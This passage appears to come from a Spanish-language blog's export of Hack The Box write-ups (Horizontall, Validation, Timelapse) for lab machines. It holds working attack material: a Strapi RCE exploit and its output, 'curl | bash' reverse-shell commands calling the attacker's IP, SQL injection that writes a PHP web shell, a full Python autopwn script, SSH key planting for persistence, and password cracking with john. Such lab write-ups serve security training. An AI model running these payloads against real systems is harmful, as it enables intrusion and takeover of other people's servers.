requests.post(f\"{url}/admin/plugins/install\", json = data, headers = headers)    print(out.text)if __name__ == (\"__main__\"):    url = sys.argv[1]    if url.endswith(\"/\"):        url = url[:-1]    check_version()    password_reset()    terminal = Terminal()    terminal.cmdloop()Obsevamos que tiene diferentes funciones, la primera se encarga de verificar la versión de strapi para ver si es vulnerable o no a este exploit. El funcionamiento de este radica en que se puede cambiar la contraseña de administrador en la ruta admin/auth/reset-password sin necesidad de estar autenticado, lo que permite hacerse con el nombre de usuario y contraseña (que tu le cambiaste) fácilemente. Luego, utilizando el token jwt realiza una petición post hacia /admin/plugins/install, en la cual viaja el comando que queremos ejecutar, haciendo que esto se instale como un plugin, haciendo de esta forma posible el RCE.Probemos este exploit a ver si funciona:python3 50239.py http://api-prod.horizontall.htb[+] Checking Strapi CMS Version running[+] Seems like the exploit will work!!![+] Executing exploit[+] Password reset was successfully[+] Your email is: admin@horizontall.htb[+] Your new credentials are: admin:SuperStrongPassword1[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjc1OTc5NTUxLCJleHAiOjE2Nzg1NzE1NTF9.wl6vOWotK3bscBZJm5PuK8fBmoKsZCxByEwD9iYTizo$&gt; Ha funcionado, tenemos capacidad de ejecutar comandos en la máquina víctima, ahora intentaremos ganar acceso enviando una shell reversa hacia nuestro equipo. Intentando con varias formas de hacerlo, resultó la siguiente:En primer lugar, estaremos escuchando por netcat por el puerto 1235:nc -nvlp 1235listening on [any] 1235 ...Luego, utilizando python utilizaremos el modulo http.server para compartir el siguiente archivo .html:#!/bin/bashbash -i &gt;&amp; /dev/tcp/10.10.14.17/1235 0&gt;&amp;1El cual entablará la conexión reversa a nuestro equipo.Finalmente, en la máquina víctima haremos un curl a nuestro servidor http y luego, ejecutar ese contenido con bash:curl http://10.10.14.17/ | bashDe esta manera, el servidor en python recibe una petición:python3 -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.105 - - [09/Feb/2023 17:10:37] \"GET / HTTP/1.1\" 200 -Y por el netcat recibimos la reverse shell:nc -nvlp 1235listening on [any] 1235 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.11.105] 43042bash: cannot set terminal process group (1935): Inappropriate ioctl for devicebash: no job control in this shellstrapi@horizontall:~/myapi$ whoamiwhoamistrapiObservamos que estamos dentro de la máquina víctima y somos el usuario strapi.Buscamos la flag de usuario:strapi@horizontall:/home/developer$ cat user.txtcat user.txt9e65474e1f6d52164d71ed95Excelente, tenemos la flag del usuario strapi.Escalada de privilegiosVemos los grupos a los que pertenecemos:strapi@horizontall:/home/developer$ ididuid=1001(strapi) gid=1001(strapi) groups=1001(strapi)Buscamos si tenemos algún permiso SUID:strapi@horizontall:/$ find \\-perm -4000 2&gt;/dev/nullfind \\-perm -4000 2&gt;/dev/null./usr/bin/sudo./usr/bin/newgidmap./usr/bin/traceroute6.iputils./usr/bin/newuidmap./usr/bin/gpasswd./usr/bin/at./usr/bin/chfn./usr/bin/passwd./usr/bin/newgrp./usr/bin/pkexec./usr/bin/chsh./usr/lib/openssh/ssh-keysign./usr/lib/dbus-1.0/dbus-daemon-launch-helper./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic./usr/lib/eject/dmcrypt-get-device./usr/lib/snapd/snap-confine./usr/lib/policykit-1/polkit-agent-helper-1./bin/fusermount./bin/ping./bin/su./bin/umount./bin/mountPero no hay nada relevante, bueno no, está el pkexec, sin embargo, no haremos esa escalada.Buscaremos los puertos abiertos que tenemos en la máquina:strapi@horizontall:/$ netstat -natnetstat -natActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address           Foreign Address         State      tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN     tcp        0     13 10.10.11.105:43042      10.10.14.17:1235        ESTABLISHEDtcp6       0      0 :::80                   :::*                    LISTEN     tcp6       0      0 :::22                   :::*                    LISTEN   Observamos puertos abiertos en la máquina localmente, el primero puerto que vemos es el 8000, hacemos un curl para ver si es una página web:curl localhost:8000Observamos muchas información y si parece ser una web, por lo tanto, vamos a realizar un port-forwarding utilizando ssh para traer el puerto 8000 de la máquina víctima a nuestro equipo y tener conexión. En primer lugar, creamos un directorio .ssh para el usuario, pues no tiene:mkdir .sshDentro de este directorio crearemos un archivo que será la llave, en nuestro equipo usaremos ssh-key para generar una clave ssh:ssh-keygen -f strapiDe esta forma obtenemos la llave pública y privada, copiaremos la llave pública creada en el directorio .ssh de la máquina víctima con el nombre de authorized_keys:strapi@horizontall:~/.ssh$ lsauthorized_keysLe otorgamos el permiso 600, pues es necesario que se reconozca como llave:strapi@horizontall:~/.ssh$ chmod 600 authorized_keysHacemos lo mismo con la llave en nuestro equipo e intentamos conectarnos a través de ssh con la llave privada:ssh -i strapi strapi@10.10.11.105Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Fri Feb 10 03:09:59 UTC 2023  System load:  0.11              Processes:           180  Usage of /:   83.1% of 4.85GB   Users logged in:     0  Memory usage: 47%               IP address for eth0: 10.10.11.105  Swap usage:   0%0 updates can be applied immediately.Last login: Fri Jun  4 11:29:42 2021 from 192.168.1.15$ bashstrapi@horizontall:~$ Hemos entrado correctamente a través de ssh y no tenemos que volver a realizar la vulnerabilidad para entrar.En este punto es cuando realizaremos el port forwarding:ssh -i strapi -L 8001:127.0.0.1:8000 strapi@10.10.11.105Esto realizará una conexión a nuestro puerto 8001 con el puerto 8000 de la máquina.Luego, si vamos a nuestro localhost veremos lo siguiente:Observamos la página de Laravel, hemos hecho correctamente la conexión.En este punto, buscamos vulnerabilidades de Laravel en github y encontramos exploit, lo clonamos y vemos la forma de usarlo ./exploit.py http://localhost:8000 Monolog/RCE1 whoami, lo intentamos con nuestras direcciones:python3 exploit.py http://127.0.0.1:8001 Monolog/RCE1 whoami[i] Trying to clear logs[+] Logs cleared[i] PHPGGC not found. Cloning itCloning into 'phpggc'...remote: Enumerating objects: 3515, done.remote: Counting objects: 100% (1061/1061), done.remote: Compressing objects: 100% (465/465), done.remote: Total 3515 (delta 624), reused 873 (delta 537), pack-reused 2454Receiving objects: 100% (3515/3515), 516.75 KiB | 1.89 MiB/s, done.Resolving deltas: 100% (1496/1496), done.[+] Successfully converted logs to PHAR[+] PHAR deserialized. ExploitedrootObservamos que si es vulnerable y el exploit ha funcionado, tenemos un RCE. En este punto enviaremos el mismo comando que hicimos con el exploit anterior con netcat escuchando y el servidor en python con el recurso reverse shell activo:python3 exploit.py http://127.0.0.1:8001 Monolog/RCE1 'curl http://10.10.14.17/ | bash'Si observamos nuestro netcat y obtenemos una conexión:nc -nvlp 1235listening on [any] 1235 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.11.105] 46862bash: cannot set terminal process group (2670): Inappropriate ioctl for devicebash: no job control in this shellroot@horizontall:/home/developer/myproject/public# cdcdEn este punto ingresamos la llave pública al directorio .ssh de root como authorized_keys:root@horizontall:~# lslsboot.shpidrestart.shroot.txtroot@horizontall:~# cd .sshcd .sshroot@horizontall:~/.ssh# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzAA3JYqVn5OLwxPgPeY2KjqedY9dyAvAFRSCeiIch44xqb/DeYql+BM2TRTI03M3kk4k2Cf33ilPg/7aoTlnSnsGkt2RADKWus33roioW2vcOTVAJXvekye10FgehJEMLSWVcrn5Fz9ZE5ZKe/Cr6gE2Hmm80SxoBQV9QlQcPvUSIROHa7CPAiJIivlaHpxl94l7EBcm+cNVCcrDN5b41FobaRryd5na/quK4/buph7MYKuASCJQQI9SJu9iIBHgBZLb871qBR3riCGlHZO4XNAFb04bsNK2XRfLInGHOl1vkZjROedJ/9MgEJrxmH1HRILZEL8dJMmoCUoecCi8sT2fMGA4InDCngIl5TpediHcsOF51xWMgTlVfhX9jPu+mZD2Odmr1awb7UyDub0QZp9KsxOF9POtAJVH6L6ZA5qyDxSaP/4GzWe9yba3BYJE5TlgyBDvCl6xzVXKAlI2Gxvo8gMo4xYbCaUCS8qhk/03yna19+16LbYhkb44+Zc8= kali@kali&lt;8gMo4xYbCaUCS8qhk/03yna19+16LbYhkb44+Zc8= kali@kali&gt; ' &gt; authorized_keys' &gt; authorized_keysroot@horizontall:~/.ssh# chmod 600 authorized_keyschmod 600 authorized_keysLuego, utilizando ssh volvemos a entrar, pero esta vez como el usuario root:ssh -i strapi root@10.10.11.105Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Fri Feb 10 04:02:40 UTC 2023  System load:  0.0               Processes:           174  Usage of /:   82.0% of 4.85GB   Users logged in:     0  Memory usage: 25%               IP address for eth0: 10.10.11.105  Swap usage:   0%0 updates can be applied immediately.Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Mon Aug 23 11:27:49 2021 from 10.10.14.6root@horizontall:~# lsboot.sh  pid  restart.sh  root.txtroot@horizontall:~# cat root.txt73e15d3a03d555d83f71c0¡Bien! Tenemos la flag de administrador, hemos vulnerado completamente la máquina.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Validation HTB Write-up",
    "url": "/posts/Validation/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, SQLi, Web, Scripting, Autopwn, Linux, Easy",
    "date": "2023-02-08 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Validation, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Validation, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del sistema.  Uso de Burpsuite.  SQL Injection.  Utilización de SQL Injection para ganar acceso al sistema.  Automatización de la intrusión en python.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.11.116PING 10.10.11.116 (10.10.11.116) 56(84) bytes of data.64 bytes from 10.10.11.116: icmp_seq=1 ttl=63 time=136 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap -p- -sS -open -min-rate 5000 10.10.11.116 -oG PortsAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http4566/tcp open  kwtc8080/tcp open  http-proxyObservamos un puerto web. Vamos a realizar un escaneo de servicios para identificar versiones:sudo nmap -sCV -p22,80,4566,8080 10.10.11.116Como resultado del escaneo tenemos:PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 d8f5efd2d3f98dadc6cf24859426ef7a (RSA)|   256 463d6bcba819eb6ad06886948673e172 (ECDSA)|_  256 7032d7e377c14acf472adee5087af87a (ED25519)80/tcp   open  http    Apache httpd 2.4.48 ((Debian))|_http-server-header: Apache/2.4.48 (Debian)|_http-title: Site doesn't have a title (text/html; charset=UTF-8).4566/tcp open  http    nginx|_http-title: 403 Forbidden8080/tcp open  http    nginx|_http-title: 502 Bad GatewayService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTenemos la versión de ssh y el servicio web. Vamos a analizar este servicio utilizando en primer lugar la herramienta whatweb:whatweb 10.10.11.116http://10.10.11.116 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]Tenemos algunas de las tecnologías utilizadas en esta página, vamos a revisarla:Vemos que tenemos un campo username, probaremos con el usuario test para ver que ocurre:ExplotaciónIntentaremos probar si es vulnerable a XSS:Al ingresar:Tenemos que es vulnerable a XSS, sin embargo, esto no nos sirve porque esta página no tiene algún tipo de autenticación, no podemos por ejemplo intentar robar cookies de sesión, por lo tanto, intentaremos probar si es vulnerable a sql injection:Al parece no ocurre nada especial al agregar ‘, pero utilizaremos Burpsuite para manejar las peticiones de manera más cómoda, cuando interceptamos la petición tenemos lo siguiente:POST / HTTP/1.1Host: 10.10.11.116User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 28Origin: http://10.10.11.116Connection: closeReferer: http://10.10.11.116/Cookie: user=098f6bcd4621d373cade4e832627b4f6Upgrade-Insecure-Requests: 1username=test&amp;country=BrazilVemos que en la petición por POST va username y country, por lo tanto, intentamos agregar una comilla simple al final de brazil para ver que sucede:Se observa un error, esto nos quiere decir que es vulnerable a SQL Injection, así que probaremos payloads para ver si podemos enumerar información, por ejemplo. intentaremos utilizar union en la data:username=test&amp;country=Brazil' union select 'testing'-- -En la respuesta en raw observamos que está testing:&lt;li class='text-white'&gt;testing&lt;/li&gt;Por lo tanto, intentaremos enumerar la base de datos:username=test&amp;country=Brazil' union select database()-- -&lt;li class='text-white'&gt;registration&lt;/li&gt;Observamos que la database tiene como nombre registration, podemos intentar enumerar la versión:username=test&amp;country=Brazil' union select version()-- -&lt;li class='text-white'&gt;10.5.11-MariaDB-1&lt;/li&gt;También podemos enumerar las otras bases de datos dentro del sistema:username=test&amp;country=Brazil' union select schema_name from information_schema.schemata-- -&lt;li class='text-white'&gt;information_schema&lt;/li&gt;&lt;li class='text-white'&gt;performance_schema&lt;/li&gt;&lt;li class='text-white'&gt;mysql&lt;/li&gt;&lt;li class='text-white'&gt;registration&lt;/li&gt;Podemos ver las diferentes bases de datos del sistema, en este punto podríamos probar si tenemos capacidad de escritura utilizando into outfile dentro de /var/www/html, pues el servidor está corriendo allí según el error:username=test&amp;country=Brazil' union select \"testing\" into outfile \"/var/www/html/testing.txt\"-- -Vamos entonces hacia el navegador para ver si ha creado el recurso:Observamos que si se creó. Por lo tanto, tenemos una vía potencial de ganar acceso a la máquina, esto lo realizaremos intentando subir un archivo malicioso para poder entablar una conexión hacia nuestra máquina desde el servidor, en primer lugar vamos a crear el siguiente payload:username=test&amp;country=Brazil' union select \"&lt;?php system($_REQUEST['cmd']); ?&gt;\" into outfile \"/var/www/html/evil.php\"-- -Al ingresar al recursos creado tenemos:Por lo tanto, ahora solo basta con asignarle un valor a la variable cmd para ejecutar comandos:El siguiente paso es entablar una conexión reversa con nuestra máquina, en este caso usaremos lo siguiente:bash -c 'bash -i &gt;%26 /dev/tcp/10.10.14.17/1234 0&gt;%261'Cabe destacar que corresponde a una variación de las reverse shell de pentestmonkey, debido a hay que aplicar url encode a los caracteres especiales para que los pueda interpretar, entonces:http://10.10.11.116/evil.php?cmd=bash -c 'bash -i &gt;%26 /dev/tcp/10.10.14.17/1234 0&gt;261'Luego de ejecutar la instrucción, ya teniamos netcat previamente escuchando por el puerto 1234:sudo nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.11.116] 37056bash: cannot set terminal process group (1): Inappropriate ioctl for devicebash: no job control in this shellwww-data@validation:/var/www/html$ whoamiwhoamiwww-dataPodemos observar que hemos ingresado correctamente a la máquina.www-data@validation:/var/www/html$ lslsaccount.php  config.php  css  index.php  jsAhora buscaremos la flag de usuario:www-data@validation:/home/htb# cat user.txtcat user.txt97661213f37a875cc5951¡Bien! tenemos la flag.Escalada de privilegiosEn primer lugar, inspeccionaremos estos archivos por si hay información:www-data@validation:/var/www/html$ cat config.phpcat config.php&lt;?php  $servername = \"127.0.0.1\";  $username = \"uhc\";  $password = \"uhc-9qual-global-pw\";  $dbname = \"registration\";  $conn = new mysqli($servername, $username, $password, $dbname);?&gt;Observamos un usuario y una contraseña. Sin embargo, el usuario no existe:www-data@validation:/var/www/html$ id uhcid uhcid: 'uhc': no such userPero como tenemos la contraseña, si tenemos suerte podría ser la de administrador:www-data@validation:/var/www/html$ su rootsu rootPassword: uhc-9qual-global-pwroot@validation:/var/www/html# whoamiwhoamirootroot@validation:/var/www/html# Como la contraseña resultó ser la de root, nos hemos convertido en admin, ahora buscaremos la flag de root:root@validation:~# cat root.txtcat root.txtf9f6320d7a1fc7f4d4a0Hemos vulnerado completamente la máquina hasta ser administradores.Sin embargo, como la escalada ha sido bastante lamentable, haremos un script en python para automatizar la intrusión:En primer lugar, utilizaremos la libreria requests y pwn para realizar las conexiones, empezaremos definiendo las IP:target = 'http://10.10.11.116'target2 = 'http://10.10.11.116/evil.php'ip = '10.10.14.17' # cambiar estosession = requests.session()Luego, después de definir las variables globales haremos una función llamada sqli, la cual hará la creación del archivo malicioso en el servidor web:def sqli():    payload=  \"\"\"Brazil' union select \"&lt;?php system($_REQUEST['cmd']); ?&gt;\" into outfile \"/var/www/html/evil.php\"-- -\"\"\"        post_data =  {        'username':'test',        'country':payload        }    session.post(target,data=post_data)Luego, creamos la función que entablará la conexión reversa a nuestra máquina:def reverse():    payload =\"bash -c 'bash -i &gt;&amp; /dev/tcp/%s/1234 0&gt;&amp;1'\" %ip    post_data={        'cmd':payload    }    session.post(target2,data=post_data)Finalmente, tenemos el main, en el cual llamaremos a estas dos funciones:if __name__ == '__main__':    sqli()    threading.Thread(target=reverse, args=()).start()    shell = listen(1234,timeout=10).wait_for_connection()    shell.interactive()En primer lugar, llamamos a la función sqli para que suba el archivo malicioso a la web. En segundo lugar, trabajamos con hilos para que la función reverse se ejecute correctamente mientras estamos esperando una conexión por el puerto 1234 para luego tener una consola interactiva.Con todo lo anterior, basta con cambiar la IP dependiendo de cual tengas y al ejecutar el código tendras una reverse shell para el usuario www-data.El código completo es:import requestsfrom pwn import *target = 'http://10.10.11.116'target2 = 'http://10.10.11.116/evil.php'ip = '10.10.14.17' # cambiar estosession = requests.session()def sqli():    payload=  \"\"\"Brazil' union select \"&lt;?php system($_REQUEST['cmd']); ?&gt;\" into outfile \"/var/www/html/evil.php\"-- -\"\"\"        post_data =  {        'username':'test',        'country':payload        }    session.post(target,data=post_data)def reverse():    payload =\"bash -c 'bash -i &gt;&amp; /dev/tcp/%s/1234 0&gt;&amp;1'\" %ip    post_data={        'cmd':payload    }    session.post(target2,data=post_data)if __name__ == '__main__':    sqli()    threading.Thread(target=reverse, args=()).start()    shell = listen(1234,timeout=10).wait_for_connection()    shell.interactive()!Listo!Hemos realizado la automatización de la intrusión.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Timelapse HTB Write-up",
    "url": "/posts/Timelapse/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, Active Directory, ZIP cracking, PFX cracking, Openssl, Private key, LAPS, Windows, Easy",
    "date": "2023-02-08 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Timelapse, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración ...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Timelapse, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del sistema, en este caso es de directorio activo (smbmap, smbclient, crackmapexec).  Cracking de archivos ZIP protegidos.  Cracking de archivos .PFX  Extracción de clave privada y certificado a partir de archivo .PFX con openssl.  Abusando de LAPS para obtener contraseñas utilizando crackmapexec.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.11.152PING 10.10.11.152 (10.10.11.152) 56(84) bytes of data.64 bytes from 10.10.11.152: icmp_seq=1 ttl=127 time=545 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap -p- -sS -open -min-rate 5000 -Pn 10.10.11.152 -oG PortsAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT      STATE SERVICE53/tcp    open  domain88/tcp    open  kerberos-sec135/tcp   open  msrpc139/tcp   open  netbios-ssn389/tcp   open  ldap445/tcp   open  microsoft-ds464/tcp   open  kpasswd5593/tcp   open  http-rpc-epmap636/tcp   open  ldapssl3268/tcp  open  globalcatLDAP3269/tcp  open  globalcatLDAPssl5986/tcp  open  wsmans9389/tcp  open  adws49667/tcp open  unknown49673/tcp open  unknown49674/tcp open  unknown49692/tcp open  unknown49704/tcp open  unknownLos puertos expuestos de la máquina nos hacen pensar que se trata de un directorio activo, sin embargo, realizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49692,49704 10.10.11.152Como resultado del escaneo tenemos:PORT      STATE SERVICE           VERSION53/tcp    open  domain            Simple DNS Plus88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-02-08 14:02:30Z)135/tcp   open  msrpc             Microsoft Windows RPC139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)445/tcp   open  microsoft-ds?464/tcp   open  kpasswd5?593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0636/tcp   open  ldapssl?3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)3269/tcp  open  globalcatLDAPssl?5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_ssl-date: 2023-02-08T14:04:02+00:00; +7h59m59s from scanner time.| tls-alpn: |_  http/1.1|_http-server-header: Microsoft-HTTPAPI/2.0| ssl-cert: Subject: commonName=dc01.timelapse.htb| Not valid before: 2021-10-25T14:05:29|_Not valid after:  2022-10-25T14:25:299389/tcp  open  mc-nmf            .NET Message Framing49667/tcp open  msrpc             Microsoft Windows RPC49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.049674/tcp open  msrpc             Microsoft Windows RPC49692/tcp open  msrpc             Microsoft Windows RPC49704/tcp open  msrpc             Microsoft Windows RPCService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: |   311: |_    Message signing enabled and required| smb2-time: |   date: 2023-02-08T14:03:25|_  start_date: N/A|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57sEfectivamente, estamos frente a un directorio activo. En primer lugar, se observa el puerto 445 abierto, el cual corresponde al servicio smb, por lo tanto, intentaremos realizar una enumeración del equipo y también si es posible de usuarios o recursos, para ello usaremos diferentes herramientas, la primera es crackmapexec:crackmapexec smb 10.10.11.152SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)Se puede observar que es un DC y que el dominio es timelapse.htb, por lo tanto, abrimos el /etc/hosts e ingresamos dicho nombre de dominio:127.0.0.1       localhost127.0.1.1       kali::1             localhost ip6-localhost ip6-loopbackff02::1         ip6-allnodesff02::2         ip6-allrouters10.10.11.152    timelapse.htbPara de esta manera tener conectividad, para comprobarlo utilizamos ping:ping -c 1 timelapse.htbPING timelapse.htb (10.10.11.152) 56(84) bytes of data.64 bytes from timelapse.htb (10.10.11.152): icmp_seq=1 ttl=127 time=641 msLuego de comprobar lo anterior, probamos si se pueden listar archivos compartidos en la red, para ello utilizamos smbmap utilizando Guest sesion:smbmap -H 10.10.11.152 -u'null'[+] Guest session       IP: 10.10.11.152:445    Name: timelapse.htb                                             Disk                                                    Permissions     Comment        ----                                                    -----------     -------        ADMIN$                                                  NO ACCESS       Remote Admin        C$                                                      NO ACCESS       Default share        IPC$                                                    READ ONLY       Remote IPC        NETLOGON                                                NO ACCESS       Logon server share         Shares                                                  READ ONLY        SYSVOL                                                  NO ACCESS       Logon server share Observamos que tenemos capacidad de lectura para el recurso Shares, asi que nos conectaremos utilizando smbclient:smbclient //10.10.11.152/shares -NTry \"help\" to get a list of possible commands.smb: \\&gt; Ingresamos correctamente, ahora buscaremos que recursos compartidos existen:smb: \\Dev\\&gt; dir  .                                   D        0  Mon Oct 25 15:40:06 2021  ..                                  D        0  Mon Oct 25 15:40:06 2021  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021Encontramos un archivo dentro de la carpeta Dev llamado winrm_backup.zip, el cual se ve prometedor, por lo tanto, lo pasamos a nuestro equipo:smb: \\Dev\\&gt; get winrm_backup.zipgetting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)Si seguimos buscando en los directorios encontramos lo siguiente:smb: \\HelpDesk\\&gt; dir  .                                   D        0  Mon Oct 25 11:48:42 2021  ..                                  D        0  Mon Oct 25 11:48:42 2021  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021Encontramos diversos archivos de LAPS, el cual corresponde a una solución de Microsoft que permite administrar las contraseñas de cuentas de administrador local para equipos unidos a un dominio. Sin embargo, no podemos realizar nada con estos archivos, pero vale la pena saber que están implementados.ExplotaciónVolviendo con el winrm_backup.zip tenemos:unzip winrm_backup.zipArchive:  winrm_backup.zip[winrm_backup.zip] legacyy_dev_auth.pfx password: Pide una contraseña, la cual no tenemos, por lo tanto, vamos a intentar crackear dicha contraseña utilizando zip2john, el cual extraer un hash que podemos intentar crackear:ip2john winrm_backup.zip &gt; hashver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8Utilizando el mismo john intentaremos romper este hash:john --wordlist=/usr/share/wordlists/rockyou.txt hashUsing default input encoding: UTF-8Loaded 1 password hash (PKZIP [32/64])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statussupremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     1g 0:00:00:00 DONE (2023-02-08 01:34) 3.030g/s 10525Kp/s 10525Kc/s 10525KC/s surkerior..superkebabUse the \"--show\" option to display all of the cracked passwords reliablySession completed. Pudimos encontrar la contraseña, la cual corresponde a supremelegacy asi que la utilizaremos para abrir el .zip:unzip winrm_backup.zipArchive:  winrm_backup.zip[winrm_backup.zip] legacyy_dev_auth.pfx password:   inflating: legacyy_dev_auth.pfxTenemos un archivo .pfx, el cual corresponde a un archivo de seguridad con clave privada de un certificado, si buscamos como abrir este tipo de archivo encontramos esta web, la cual nos dice como extraer una llave privada y un certificado a partir del archivo .pfx asi que vamos a intentarlo:openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privkey -nodesEnter Import Password:Pero nos pide una contraseña, la cual no tenemos.Utilizando la herramienta pfx2john podemos obtener la contraseña de este archivo .pfx:pfx2john legacyy_dev_auth.pfx &gt; hashpfxEsto nos extrae un hash que podemos intentar romper, para esto utilizaremos john:john --wordlist=/usr/share/wordlists/rockyou.txt hashpfxUsing default input encoding: UTF-8Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])Cost 1 (iteration count) is 2000 for all loaded hashesCost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusthuglegacy       (legacyy_dev_auth.pfx)     1g 0:00:01:15 DONE (2023-02-08 01:53) 0.01326g/s 42860p/s 42860c/s 42860C/s thuglife06..thug211Use the \"--show\" option to display all of the cracked passwords reliablySession completed. Tenemos la contraseña, la cual es ‘thuglegacy’, asi que utilizamos esta contraseña para extraer la clave privada y el certificado:openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privkey -nodesEnter Import Password:lslegacyy_dev_auth.pfx  privkeyTenemos la llave privada, ahora iremos por el certificado:openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pemEnter Import Password:lscertificate.pem  legacyy_dev_auth.pfx  privkeyTenemos en nuestro poder la clave privada y el certificado, esto nos sirve pues al tenerlos podemos autenticarnos en la máquina utilizando evil-winrm:Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]    -S, --ssl                        Enable ssl    -c, --pub-key 